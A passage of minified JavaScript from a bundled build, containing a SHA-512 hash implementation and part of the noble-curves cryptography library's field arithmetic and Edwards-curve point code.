  , St$3 = BigInt(32);
function le$2(q, U=!1) {
    return U ? {
        h: Number(q & wt$2),
        l: Number(q >> St$3 & wt$2)
    } : {
        h: Number(q >> St$3 & wt$2) | 0,
        l: Number(q & wt$2) | 0
    }
}
function mn$2(q, U=!1) {
    let Z = new Uint32Array(q.length)
      , oe = new Uint32Array(q.length);
    for (let et = 0; et < q.length; et++) {
        const {h: st, l: ws} = le$2(q[et], U);
        [Z[et],oe[et]] = [st, ws]
    }
    return [Z, oe]
}
const _n$2 = (q, U) => BigInt(q >>> 0) << St$3 | BigInt(U >>> 0)
  , Sn$2 = (q, U, Z) => q >>> Z
  , vn$2 = (q, U, Z) => q << 32 - Z | U >>> Z
  , In$2 = (q, U, Z) => q >>> Z | U << 32 - Z
  , Un$2 = (q, U, Z) => q << 32 - Z | U >>> Z
  , Tn$2 = (q, U, Z) => q << 64 - Z | U >>> Z - 32
  , Fn$1 = (q, U, Z) => q >>> Z - 32 | U << 64 - Z
  , Nn$2 = (q, U) => U
  , Ln$2 = (q, U) => q
  , On$2 = (q, U, Z) => q << Z | U >>> 32 - Z
  , Hn$2 = (q, U, Z) => U << Z | q >>> 32 - Z
  , zn$1 = (q, U, Z) => U << Z - 32 | q >>> 64 - Z
  , Mn$2 = (q, U, Z) => q << Z - 32 | U >>> 64 - Z;
function qn$2(q, U, Z, oe) {
    const et = (U >>> 0) + (oe >>> 0);
    return {
        h: q + Z + (et / 2 ** 32 | 0) | 0,
        l: et | 0
    }
}
const $n$2 = (q, U, Z) => (q >>> 0) + (U >>> 0) + (Z >>> 0)
  , kn$2 = (q, U, Z, oe) => U + Z + oe + (q / 2 ** 32 | 0) | 0
  , Rn$2 = (q, U, Z, oe) => (q >>> 0) + (U >>> 0) + (Z >>> 0) + (oe >>> 0)
  , jn$2 = (q, U, Z, oe, et) => U + Z + oe + et + (q / 2 ** 32 | 0) | 0
  , Zn$1 = (q, U, Z, oe, et) => (q >>> 0) + (U >>> 0) + (Z >>> 0) + (oe >>> 0) + (et >>> 0)
  , Gn$1 = (q, U, Z, oe, et, st) => U + Z + oe + et + st + (q / 2 ** 32 | 0) | 0
  , x$1 = {
    fromBig: le$2,
    split: mn$2,
    toBig: _n$2,
    shrSH: Sn$2,
    shrSL: vn$2,
    rotrSH: In$2,
    rotrSL: Un$2,
    rotrBH: Tn$2,
    rotrBL: Fn$1,
    rotr32H: Nn$2,
    rotr32L: Ln$2,
    rotlSH: On$2,
    rotlSL: Hn$2,
    rotlBH: zn$1,
    rotlBL: Mn$2,
    add: qn$2,
    add3L: $n$2,
    add3H: kn$2,
    add4L: Rn$2,
    add4H: jn$2,
    add5H: Gn$1,
    add5L: Zn$1
}
  , [Vn$2,Yn$1] = ( () => x$1.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map(q => BigInt(q))))()
  , P$1 = new Uint32Array(80)
  , Q$2 = new Uint32Array(80);
let Jn$2 = class extends An$2 {
    constructor() {
        super(128, 64, 16, !1),
        this.Ah = 1779033703,
        this.Al = -205731576,
        this.Bh = -1150833019,
        this.Bl = -2067093701,
        this.Ch = 1013904242,
        this.Cl = -23791573,
        this.Dh = -1521486534,
        this.Dl = 1595750129,
        this.Eh = 1359893119,
        this.El = -1377402159,
        this.Fh = -1694144372,
        this.Fl = 725511199,
        this.Gh = 528734635,
        this.Gl = -79577749,
        this.Hh = 1541459225,
        this.Hl = 327033209
    }
    get() {
        const {Ah: U, Al: Z, Bh: oe, Bl: et, Ch: st, Cl: ws, Dh: ms, Dl: Es, Eh: vs, El: _s, Fh: Is, Fl: Ss, Gh: Ts, Gl: Rs, Hh: Ns, Hl: Hs} = this;
        return [U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs]
    }
    set(U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs) {
        this.Ah = U | 0,
        this.Al = Z | 0,
        this.Bh = oe | 0,
        this.Bl = et | 0,
        this.Ch = st | 0,
        this.Cl = ws | 0,
        this.Dh = ms | 0,
        this.Dl = Es | 0,
        this.Eh = vs | 0,
        this.El = _s | 0,
        this.Fh = Is | 0,
        this.Fl = Ss | 0,
        this.Gh = Ts | 0,
        this.Gl = Rs | 0,
        this.Hh = Ns | 0,
        this.Hl = Hs | 0
    }
    process(U, Z) {
        for (let Zs = 0; Zs < 16; Zs++,
        Z += 4)
            P$1[Zs] = U.getUint32(Z),
            Q$2[Zs] = U.getUint32(Z += 4);
        for (let Zs = 16; Zs < 80; Zs++) {
            const Qa = P$1[Zs - 15] | 0
              , Ga = Q$2[Zs - 15] | 0
              , nl = x$1.rotrSH(Qa, Ga, 1) ^ x$1.rotrSH(Qa, Ga, 8) ^ x$1.shrSH(Qa, Ga, 7)
              , sl = x$1.rotrSL(Qa, Ga, 1) ^ x$1.rotrSL(Qa, Ga, 8) ^ x$1.shrSL(Qa, Ga, 7)
              , el = P$1[Zs - 2] | 0
              , Bs = Q$2[Zs - 2] | 0
              , Fa = x$1.rotrSH(el, Bs, 19) ^ x$1.rotrBH(el, Bs, 61) ^ x$1.shrSH(el, Bs, 6)
              , Js = x$1.rotrSL(el, Bs, 19) ^ x$1.rotrBL(el, Bs, 61) ^ x$1.shrSL(el, Bs, 6)
              , Wa = x$1.add4L(sl, Js, Q$2[Zs - 7], Q$2[Zs - 16])
              , Za = x$1.add4H(Wa, nl, Fa, P$1[Zs - 7], P$1[Zs - 16]);
            P$1[Zs] = Za | 0,
            Q$2[Zs] = Wa | 0
        }
        let {Ah: oe, Al: et, Bh: st, Bl: ws, Ch: ms, Cl: Es, Dh: vs, Dl: _s, Eh: Is, El: Ss, Fh: Ts, Fl: Rs, Gh: Ns, Gl: Hs, Hh: ha, Hl: pa} = this;
        for (let Zs = 0; Zs < 80; Zs++) {
            const Qa = x$1.rotrSH(Is, Ss, 14) ^ x$1.rotrSH(Is, Ss, 18) ^ x$1.rotrBH(Is, Ss, 41)
              , Ga = x$1.rotrSL(Is, Ss, 14) ^ x$1.rotrSL(Is, Ss, 18) ^ x$1.rotrBL(Is, Ss, 41)
              , nl = Is & Ts ^ ~Is & Ns
              , sl = Ss & Rs ^ ~Ss & Hs
              , el = x$1.add5L(pa, Ga, sl, Yn$1[Zs], Q$2[Zs])
              , Bs = x$1.add5H(el, ha, Qa, nl, Vn$2[Zs], P$1[Zs])
              , Fa = el | 0
              , Js = x$1.rotrSH(oe, et, 28) ^ x$1.rotrBH(oe, et, 34) ^ x$1.rotrBH(oe, et, 39)
              , Wa = x$1.rotrSL(oe, et, 28) ^ x$1.rotrBL(oe, et, 34) ^ x$1.rotrBL(oe, et, 39)
              , Za = oe & st ^ oe & ms ^ st & ms
              , tl = et & ws ^ et & Es ^ ws & Es;
            ha = Ns | 0,
            pa = Hs | 0,
            Ns = Ts | 0,
            Hs = Rs | 0,
            Ts = Is | 0,
            Rs = Ss | 0,
            {h: Is, l: Ss} = x$1.add(vs | 0, _s | 0, Bs | 0, Fa | 0),
            vs = ms | 0,
            _s = Es | 0,
            ms = st | 0,
            Es = ws | 0,
            st = oe | 0,
            ws = et | 0;
            const za = x$1.add3L(Fa, Wa, tl);
            oe = x$1.add3H(za, Bs, Js, Za),
            et = za | 0
        }
        ({h: oe, l: et} = x$1.add(this.Ah | 0, this.Al | 0, oe | 0, et | 0)),
        {h: st, l: ws} = x$1.add(this.Bh | 0, this.Bl | 0, st | 0, ws | 0),
        {h: ms, l: Es} = x$1.add(this.Ch | 0, this.Cl | 0, ms | 0, Es | 0),
        {h: vs, l: _s} = x$1.add(this.Dh | 0, this.Dl | 0, vs | 0, _s | 0),
        {h: Is, l: Ss} = x$1.add(this.Eh | 0, this.El | 0, Is | 0, Ss | 0),
        {h: Ts, l: Rs} = x$1.add(this.Fh | 0, this.Fl | 0, Ts | 0, Rs | 0),
        {h: Ns, l: Hs} = x$1.add(this.Gh | 0, this.Gl | 0, Ns | 0, Hs | 0),
        {h: ha, l: pa} = x$1.add(this.Hh | 0, this.Hl | 0, ha | 0, pa | 0),
        this.set(oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs, ha, pa)
    }
    roundClean() {
        P$1.fill(0),
        Q$2.fill(0)
    }
    destroy() {
        this.buffer.fill(0),
        this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    }
}
;
const Kn$1 = Bn$2( () => new Jn$2);
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const vt$2 = BigInt(0)
  , be$2 = BigInt(1)
  , Wn$1 = BigInt(2);
function It$2(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function Ut$2(q) {
    if (!It$2(q))
        throw new Error("Uint8Array expected")
}
function Tt$2(q, U) {
    if (typeof U != "boolean")
        throw new Error(q + " boolean expected, got " + U)
}
const Xn$1 = Array.from({
    length: 256
}, (q, U) => U.toString(16).padStart(2, "0"));
function Ft$1(q) {
    Ut$2(q);
    let U = "";
    for (let Z = 0; Z < q.length; Z++)
        U += Xn$1[q[Z]];
    return U
}
function pe$2(q) {
    if (typeof q != "string")
        throw new Error("hex string expected, got " + typeof q);
    return q === "" ? vt$2 : BigInt("0x" + q)
}
const K = {
    _0: 48,
    _9: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function we$2(q) {
    if (q >= K._0 && q <= K._9)
        return q - K._0;
    if (q >= K.A && q <= K.F)
        return q - (K.A - 10);
    if (q >= K.a && q <= K.f)
        return q - (K.a - 10)
}
function Ee$2(q) {
    if (typeof q != "string")
        throw new Error("hex string expected, got " + typeof q);
    const U = q.length
      , Z = U / 2;
    if (U % 2)
        throw new Error("hex string expected, got unpadded hex of length " + U);
    const oe = new Uint8Array(Z);
    for (let et = 0, st = 0; et < Z; et++,
    st += 2) {
        const ws = we$2(q.charCodeAt(st))
          , ms = we$2(q.charCodeAt(st + 1));
        if (ws === void 0 || ms === void 0) {
            const Es = q[st] + q[st + 1];
            throw new Error('hex string expected, got non-hex character "' + Es + '" at index ' + st)
        }
        oe[et] = ws * 16 + ms
    }
    return oe
}
function Pn$2(q) {
    return pe$2(Ft$1(q))
}
function Et$3(q) {
    return Ut$2(q),
    pe$2(Ft$1(Uint8Array.from(q).reverse()))
}
function ge$2(q, U) {
    return Ee$2(q.toString(16).padStart(U * 2, "0"))
}
function Nt$2(q, U) {
    return ge$2(q, U).reverse()
}
function W$2(q, U, Z) {
    let oe;
    if (typeof U == "string")
        try {
            oe = Ee$2(U)
        } catch (st) {
            throw new Error(q + " must be hex string or Uint8Array, cause: " + st)
        }
    else if (It$2(U))
        oe = Uint8Array.from(U);
    else
        throw new Error(q + " must be hex string or Uint8Array");
    const et = oe.length;
    if (typeof Z == "number" && et !== Z)
        throw new Error(q + " of length " + Z + " expected, got " + et);
    return oe
}
function ye$2(...q) {
    let U = 0;
    for (let oe = 0; oe < q.length; oe++) {
        const et = q[oe];
        Ut$2(et),
        U += et.length
    }
    const Z = new Uint8Array(U);
    for (let oe = 0, et = 0; oe < q.length; oe++) {
        const st = q[oe];
        Z.set(st, et),
        et += st.length
    }
    return Z
}
const Lt$2 = q => typeof q == "bigint" && vt$2 <= q;
function Qn$2(q, U, Z) {
    return Lt$2(q) && Lt$2(U) && Lt$2(Z) && U <= q && q < Z
}
function ft$1(q, U, Z, oe) {
    if (!Qn$2(U, Z, oe))
        throw new Error("expected valid " + q + ": " + Z + " <= n < " + oe + ", got " + U)
}
function tr$2(q) {
    let U;
    for (U = 0; q > vt$2; q >>= be$2,
    U += 1)
        ;
    return U
}
const er$1 = q => (Wn$1 << BigInt(q - 1)) - be$2
  , nr$1 = {
    bigint: q => typeof q == "bigint",
    function: q => typeof q == "function",
    boolean: q => typeof q == "boolean",
    string: q => typeof q == "string",
    stringOrUint8Array: q => typeof q == "string" || It$2(q),
    isSafeInteger: q => Number.isSafeInteger(q),
    array: q => Array.isArray(q),
    field: (q, U) => U.Fp.isValid(q),
    hash: q => typeof q == "function" && Number.isSafeInteger(q.outputLen)
};
function Ot$2(q, U, Z={}) {
    const oe = (et, st, ws) => {
        const ms = nr$1[st];
        if (typeof ms != "function")
            throw new Error("invalid validator function");
        const Es = q[et];
        if (!(ws && Es === void 0) && !ms(Es, q))
            throw new Error("param " + String(et) + " is invalid. Expected " + st + ", got " + Es)
    }
    ;
    for (const [et,st] of Object.entries(U))
        oe(et, st, !1);
    for (const [et,st] of Object.entries(Z))
        oe(et, st, !0);
    return q
}
function xe$1(q) {
    const U = new WeakMap;
    return (Z, ...oe) => {
        const et = U.get(Z);
        if (et !== void 0)
            return et;
        const st = q(Z, ...oe);
        return U.set(Z, st),
        st
    }
}
const M$2 = BigInt(0)
  , N$2 = BigInt(1)
  , nt$1 = BigInt(2)
  , rr$2 = BigInt(3)
  , Ht$2 = BigInt(4)
  , Be$2 = BigInt(5)
  , Ce$2 = BigInt(8);
function H(q, U) {
    const Z = q % U;
    return Z >= M$2 ? Z : U + Z
}
function or$3(q, U, Z) {
    if (U < M$2)
        throw new Error("invalid exponent, negatives unsupported");
    if (Z <= M$2)
        throw new Error("invalid modulus");
    if (Z === N$2)
        return M$2;
    let oe = N$2;
    for (; U > M$2; )
        U & N$2 && (oe = oe * q % Z),
        q = q * q % Z,
        U >>= N$2;
    return oe
}
function J$1(q, U, Z) {
    let oe = q;
    for (; U-- > M$2; )
        oe *= oe,
        oe %= Z;
    return oe
}
function Ae$1(q, U) {
    if (q === M$2)
        throw new Error("invert: expected non-zero number");
    if (U <= M$2)
        throw new Error("invert: expected positive modulus, got " + U);
    let Z = H(q, U)
      , oe = U
      , et = M$2
      , st = N$2;
    for (; Z !== M$2; ) {
        const ws = oe / Z
          , ms = oe % Z
          , Es = et - st * ws;
        oe = Z,
        Z = ms,
        et = st,
        st = Es
    }
    if (oe !== N$2)
        throw new Error("invert: does not exist");
    return H(et, U)
}
function sr$2(q) {
    const U = (q - N$2) / nt$1;
    let Z, oe, et;
    for (Z = q - N$2,
    oe = 0; Z % nt$1 === M$2; Z /= nt$1,
    oe++)
        ;
    for (et = nt$1; et < q && or$3(et, U, q) !== q - N$2; et++)
        if (et > 1e3)
            throw new Error("Cannot find square root: likely non-prime P");
    if (oe === 1) {
        const ws = (q + N$2) / Ht$2;
        return function(ms, Es) {
            const vs = ms.pow(Es, ws);
            if (!ms.eql(ms.sqr(vs), Es))
                throw new Error("Cannot find square root");
            return vs
        }
    }
    const st = (Z + N$2) / nt$1;
    return function(ws, ms) {
        if (ws.pow(ms, U) === ws.neg(ws.ONE))
            throw new Error("Cannot find square root");
        let Es = oe
          , vs = ws.pow(ws.mul(ws.ONE, et), Z)
          , _s = ws.pow(ms, st)
          , Is = ws.pow(ms, Z);
        for (; !ws.eql(Is, ws.ONE); ) {
            if (ws.eql(Is, ws.ZERO))
                return ws.ZERO;
            let Ss = 1;
            for (let Rs = ws.sqr(Is); Ss < Es && !ws.eql(Rs, ws.ONE); Ss++)
                Rs = ws.sqr(Rs);
            const Ts = ws.pow(vs, N$2 << BigInt(Es - Ss - 1));
            vs = ws.sqr(Ts),
            _s = ws.mul(_s, Ts),
            Is = ws.mul(Is, vs),
            Es = Ss
        }
        return _s
    }
}
function ir$2(q) {
    if (q % Ht$2 === rr$2) {
        const U = (q + N$2) / Ht$2;
        return function(Z, oe) {
            const et = Z.pow(oe, U);
            if (!Z.eql(Z.sqr(et), oe))
                throw new Error("Cannot find square root");
            return et
        }
    }
    if (q % Ce$2 === Be$2) {
        const U = (q - Be$2) / Ce$2;
        return function(Z, oe) {
            const et = Z.mul(oe, nt$1)
              , st = Z.pow(et, U)
              , ws = Z.mul(oe, st)
              , ms = Z.mul(Z.mul(ws, nt$1), st)
              , Es = Z.mul(ws, Z.sub(ms, Z.ONE));
            if (!Z.eql(Z.sqr(Es), oe))
                throw new Error("Cannot find square root");
            return Es
        }
    }
    return sr$2(q)
}
const ur$1 = (q, U) => (H(q, U) & N$2) === N$2
  , cr$2 = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function ar$1(q) {
    const U = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "isSafeInteger",
        BITS: "isSafeInteger"
    }
      , Z = cr$2.reduce( (oe, et) => (oe[et] = "function",
    oe), U);
    return Ot$2(q, Z)
}
function fr$2(q, U, Z) {
    if (Z < M$2)
        throw new Error("invalid exponent, negatives unsupported");
    if (Z === M$2)
        return q.ONE;
    if (Z === N$2)
        return U;
    let oe = q.ONE
      , et = U;
    for (; Z > M$2; )
        Z & N$2 && (oe = q.mul(oe, et)),
        et = q.sqr(et),
        Z >>= N$2;
    return oe
}
function Dr$2(q, U) {
    const Z = new Array(U.length)
      , oe = U.reduce( (st, ws, ms) => q.is0(ws) ? st : (Z[ms] = st,
    q.mul(st, ws)), q.ONE)
      , et = q.inv(oe);
    return U.reduceRight( (st, ws, ms) => q.is0(ws) ? st : (Z[ms] = q.mul(st, Z[ms]),
    q.mul(st, ws)), et),
    Z
}
function me$2(q, U) {
    const Z = U !== void 0 ? U : q.toString(2).length
      , oe = Math.ceil(Z / 8);
    return {
        nBitLength: Z,
        nByteLength: oe
    }
}
function _e$3(q, U, Z=!1, oe={}) {
    if (q <= M$2)
        throw new Error("invalid field: expected ORDER > 0, got " + q);
    const {nBitLength: et, nByteLength: st} = me$2(q, U);
    if (st > 2048)
        throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let ws;
    const ms = Object.freeze({
        ORDER: q,
        isLE: Z,
        BITS: et,
        BYTES: st,
        MASK: er$1(et),
        ZERO: M$2,
        ONE: N$2,
        create: Es => H(Es, q),
        isValid: Es => {
            if (typeof Es != "bigint")
                throw new Error("invalid field element: expected bigint, got " + typeof Es);
            return M$2 <= Es && Es < q
        }
        ,
        is0: Es => Es === M$2,
        isOdd: Es => (Es & N$2) === N$2,
        neg: Es => H(-Es, q),
        eql: (Es, vs) => Es === vs,
        sqr: Es => H(Es * Es, q),
        add: (Es, vs) => H(Es + vs, q),
        sub: (Es, vs) => H(Es - vs, q),
        mul: (Es, vs) => H(Es * vs, q),
        pow: (Es, vs) => fr$2(ms, Es, vs),
        div: (Es, vs) => H(Es * Ae$1(vs, q), q),
        sqrN: Es => Es * Es,
        addN: (Es, vs) => Es + vs,
        subN: (Es, vs) => Es - vs,
        mulN: (Es, vs) => Es * vs,
        inv: Es => Ae$1(Es, q),
        sqrt: oe.sqrt || (Es => (ws || (ws = ir$2(q)),
        ws(ms, Es))),
        invertBatch: Es => Dr$2(ms, Es),
        cmov: (Es, vs, _s) => _s ? vs : Es,
        toBytes: Es => Z ? Nt$2(Es, st) : ge$2(Es, st),
        fromBytes: Es => {
            if (Es.length !== st)
                throw new Error("Field.fromBytes: expected " + st + " bytes, got " + Es.length);
            return Z ? Et$3(Es) : Pn$2(Es)
        }
    });
    return Object.freeze(ms)
}
const Se$1 = BigInt(0)
  , gt$2 = BigInt(1);
function zt$2(q, U) {
    const Z = U.negate();
    return q ? Z : U
}
function ve$1(q, U) {
    if (!Number.isSafeInteger(q) || q <= 0 || q > U)
        throw new Error("invalid window size, expected [1.." + U + "], got W=" + q)
}
function Mt$2(q, U) {
    ve$1(q, U);
    const Z = Math.ceil(U / q) + 1
      , oe = 2 ** (q - 1);
    return {
        windows: Z,
        windowSize: oe
    }
}
function dr$2(q, U) {
    if (!Array.isArray(q))
        throw new Error("array expected");
    q.forEach( (Z, oe) => {
        if (!(Z instanceof U))
            throw new Error("invalid point at index " + oe)
    }
    )
}
function hr$2(q, U) {
    if (!Array.isArray(q))
        throw new Error("array of scalars expected");
    q.forEach( (Z, oe) => {
        if (!U.isValid(Z))
            throw new Error("invalid scalar at index " + oe)
    }
    )
}
const qt$2 = new WeakMap
  , Ie$2 = new WeakMap;
function $t$2(q) {
    return Ie$2.get(q) || 1
}
function lr$1(q, U) {
    return {
        constTimeNegate: zt$2,
        hasPrecomputes(Z) {
            return $t$2(Z) !== 1
        },
        unsafeLadder(Z, oe, et=q.ZERO) {
            let st = Z;
            for (; oe > Se$1; )
                oe & gt$2 && (et = et.add(st)),
                st = st.double(),
                oe >>= gt$2;
            return et
        },
        precomputeWindow(Z, oe) {
            const {windows: et, windowSize: st} = Mt$2(oe, U)
              , ws = [];
            let ms = Z
              , Es = ms;
            for (let vs = 0; vs < et; vs++) {
                Es = ms,
                ws.push(Es);
                for (let _s = 1; _s < st; _s++)
                    Es = Es.add(ms),
                    ws.push(Es);
                ms = Es.double()
            }
            return ws
        },
        wNAF(Z, oe, et) {
            const {windows: st, windowSize: ws} = Mt$2(Z, U);
            let ms = q.ZERO
              , Es = q.BASE;
            const vs = BigInt(2 ** Z - 1)
              , _s = 2 ** Z
              , Is = BigInt(Z);
            for (let Ss = 0; Ss < st; Ss++) {
                const Ts = Ss * ws;
                let Rs = Number(et & vs);
                et >>= Is,
                Rs > ws && (Rs -= _s,
                et += gt$2);
                const Ns = Ts
                  , Hs = Ts + Math.abs(Rs) - 1
                  , ha = Ss % 2 !== 0
                  , pa = Rs < 0;
                Rs === 0 ? Es = Es.add(zt$2(ha, oe[Ns])) : ms = ms.add(zt$2(pa, oe[Hs]))
            }
            return {
                p: ms,
                f: Es
            }
        },
        wNAFUnsafe(Z, oe, et, st=q.ZERO) {
            const {windows: ws, windowSize: ms} = Mt$2(Z, U)
              , Es = BigInt(2 ** Z - 1)
              , vs = 2 ** Z
              , _s = BigInt(Z);
            for (let Is = 0; Is < ws; Is++) {
                const Ss = Is * ms;
                if (et === Se$1)
                    break;
                let Ts = Number(et & Es);
                if (et >>= _s,
                Ts > ms && (Ts -= vs,
                et += gt$2),
                Ts === 0)
                    continue;
                let Rs = oe[Ss + Math.abs(Ts) - 1];
                Ts < 0 && (Rs = Rs.negate()),
                st = st.add(Rs)
            }
            return st
        },
        getPrecomputes(Z, oe, et) {
            let st = qt$2.get(oe);
            return st || (st = this.precomputeWindow(oe, Z),
            Z !== 1 && qt$2.set(oe, et(st))),
            st
        },
        wNAFCached(Z, oe, et) {
            const st = $t$2(Z);
            return this.wNAF(st, this.getPrecomputes(st, Z, et), oe)
        },
        wNAFCachedUnsafe(Z, oe, et, st) {
            const ws = $t$2(Z);
            return ws === 1 ? this.unsafeLadder(Z, oe, st) : this.wNAFUnsafe(ws, this.getPrecomputes(ws, Z, et), oe, st)
        },
        setWindowSize(Z, oe) {
            ve$1(oe, U),
            Ie$2.set(Z, oe),
            qt$2.delete(Z)
        }
    }
}
function br$2(q, U, Z, oe) {
    if (dr$2(Z, q),
    hr$2(oe, U),
    Z.length !== oe.length)
        throw new Error("arrays of points and scalars must have equal length");
    const et = q.ZERO
      , st = tr$2(BigInt(Z.length))
      , ws = st > 12 ? st - 3 : st > 4 ? st - 2 : st ? 2 : 1
      , ms = (1 << ws) - 1
      , Es = new Array(ms + 1).fill(et)
      , vs = Math.floor((U.BITS - 1) / ws) * ws;
    let _s = et;
    for (let Is = vs; Is >= 0; Is -= ws) {
        Es.fill(et);
        for (let Ts = 0; Ts < oe.length; Ts++) {
            const Rs = oe[Ts]
              , Ns = Number(Rs >> BigInt(Is) & BigInt(ms));
            Es[Ns] = Es[Ns].add(Z[Ts])
        }
        let Ss = et;
        for (let Ts = Es.length - 1, Rs = et; Ts > 0; Ts--)
            Rs = Rs.add(Es[Ts]),
            Ss = Ss.add(Rs);
        if (_s = _s.add(Ss),
        Is !== 0)
            for (let Ts = 0; Ts < ws; Ts++)
                _s = _s.double()
    }
    return _s
}
function pr$2(q) {
    return ar$1(q.Fp),
    Ot$2(q, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }),
    Object.freeze({
        ...me$2(q.n, q.nBitLength),
        ...q,
        p: q.Fp.ORDER
    })
}
const G$2 = BigInt(0)
  , j = BigInt(1)
  , yt$1 = BigInt(2)
  , wr$2 = BigInt(8)
  , Er$2 = {
    zip215: !0
};
function gr$2(q) {
    const U = pr$2(q);
    return Ot$2(q, {
        hash: "function",
        a: "bigint",
        d: "bigint",
        randomBytes: "function"
    }, {
        adjustScalarBytes: "function",
        domain: "function",
        uvRatio: "function",
        mapToCurve: "function"
    }),
    Object.freeze({
        ...U
    })
}
function yr$2(q) {
    const U = gr$2(q)
      , {Fp: Z, n: oe, prehash: et, hash: st, randomBytes: ws, nByteLength: ms, h: Es} = U
      , vs = yt$1 << BigInt(ms * 8) - j
      , _s = Z.create
      , Is = _e$3(U.n, U.nBitLength)
      , Ss = U.uvRatio || ( (za, Ws) => {
        try {
            return {
                isValid: !0,
                value: Z.sqrt(za * Z.inv(Ws))
            }
        } catch {
            return {
                isValid: !1,
                value: G$2
            }
        }
    }
    )
      , Ts = U.adjustScalarBytes || (za => za)
      , Rs = U.domain || ( (za, Ws, Ja) => {
        if (Tt$2("phflag", Ja),
        Ws.length || Ja)
            throw new Error("Contexts/pre-hash are not supported");
        return za
    }
    );
    function Ns(za, Ws) {
        ft$1("coordinate " + za, Ws, G$2, vs)
    }
    function Hs(za) {
        if (!(za instanceof Zs))
            throw new Error("ExtendedPoint expected")
    }
    const ha = xe$1( (za, Ws) => {
        const {ex: Ja, ey: Xa, ez: Ya} = za
          , rl = za.is0();
        Ws == null && (Ws = rl ? wr$2 : Z.inv(Ya));
        const il = _s(Ja * Ws)
          , ol = _s(Xa * Ws)
          , al = _s(Ya * Ws);
        if (rl)
            return {
                x: G$2,
                y: j
            };
        if (al !== j)
            throw new Error("invZ was invalid");
        return {
            x: il,
            y: ol
        }
    }
    )
      , pa = xe$1(za => {
        const {a: Ws, d: Ja} = U;
        if (za.is0())
            throw new Error("bad point: ZERO");
        const {ex: Xa, ey: Ya, ez: rl, et: il} = za
          , ol = _s(Xa * Xa)
          , al = _s(Ya * Ya)
          , cl = _s(rl * rl)
          , ll = _s(cl * cl)
          , ul = _s(ol * Ws)
          , dl = _s(cl * _s(ul + al))
          , fl = _s(ll + _s(Ja * _s(ol * al)));
        if (dl !== fl)
            throw new Error("bad point: equation left != right (1)");
        const hl = _s(Xa * Ya)
          , pl = _s(rl * il);
        if (hl !== pl)
            throw new Error("bad point: equation left != right (2)");
        return !0
    }
    );
    class Zs {
        constructor(Ws, Ja, Xa, Ya) {
            this.ex = Ws,
            this.ey = Ja,
            this.ez = Xa,
            this.et = Ya,
            Ns("x", Ws),
            Ns("y", Ja),
            Ns("z", Xa),
            Ns("t", Ya),
            Object.freeze(this)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static fromAffine(Ws) {
            if (Ws instanceof Zs)
                throw new Error("extended point not allowed");
            const {x: Ja, y: Xa} = Ws || {};
            return Ns("x", Ja),
            Ns("y", Xa),
            new Zs(Ja,Xa,j,_s(Ja * Xa))
        }
        static normalizeZ(Ws) {
            const Ja = Z.invertBatch(Ws.map(Xa => Xa.ez));
            return Ws.map( (Xa, Ya) => Xa.toAffine(Ja[Ya])).map(Zs.fromAffine)
        }
        static msm(Ws, Ja) {
            return br$2(Zs, Is, Ws, Ja)
        }
        _setWindowSize(Ws) {
            nl.setWindowSize(this, Ws)
        }
        assertValidity() {
            pa(this)
        }
        equals(Ws) {
            Hs(Ws);
            const {ex: Ja, ey: Xa, ez: Ya} = this
              , {ex: rl, ey: il, ez: ol} = Ws
